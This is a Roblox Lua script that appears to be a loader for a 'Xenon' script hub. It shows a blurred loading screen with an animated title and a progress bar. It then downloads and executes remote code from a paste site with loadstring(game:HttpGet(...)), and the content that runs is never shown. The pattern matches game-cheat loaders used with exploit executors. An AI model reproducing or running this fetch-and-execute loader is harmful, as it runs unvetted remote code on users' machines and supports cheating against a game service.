local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "Xenon_HUB_GUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 24}):Play()

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 360, 0, 120)
frame.Position = UDim2.new(0.5, -180, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 0
frame.Parent = gui

local outline = Instance.new("UIStroke")
outline.Thickness = 3
outline.Color = Color3.fromRGB(0, 255, 0)
outline.Parent = frame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(0, 255, 0)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -20, 0, 20)
status.Position = UDim2.new(0, 10, 0, 45)
status.BackgroundTransparency = 1
status.Text = "Loading script..."
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.TextSize = 14
status.Font = Enum.Font.GothamSemibold
status.Parent = frame

local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -35, 0, 5)
close.BackgroundTransparency = 1
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.TextScaled = true
close.Font = Enum.Font.GothamBold
close.Parent = frame
close.MouseButton1Click:Connect(function()
    gui:Destroy()
    blur:Destroy()
end)

-- Loading bar
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(1, -40, 0, 20)
barBg.Position = UDim2.new(0, 20, 0, 75)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.Parent = frame

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(0, 6)
barBgCorner.Parent = barBg

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
bar.Parent = barBg

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 6)
barCorner.Parent = bar

-- Typing title animation
local function typeTitle(t, s)
    s = s or 0.1
    title.Text = ""
    for i = 1, #t do
        title.Text = t:sub(1, i)
        task.wait(s)
    end
end

-- Animate title in background
task.spawn(function()
    while gui.Parent do
        typeTitle("Xenon")
        task.wait(0.5)
        title.Text = ""
        task.wait(0.5)
    end
end)

-- Auto-load with no key required
task.spawn(function()
    -- Animate loading bar
    TweenService:Create(bar, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(1, 0, 1, 0)
    }):Play()
    task.wait(1.5)

    StarterGui:SetCore("SendNotification", {
        Title = "Xenon",
        Text = "Script loaded!",
        Duration = 3
    })
    gui:Destroy()
    blur:Destroy()

    -- Execute the embedded script below
    loadstring(game:HttpGet("https://pastefy.app/rCChzMPK/raw?part=Loader"))()
end)
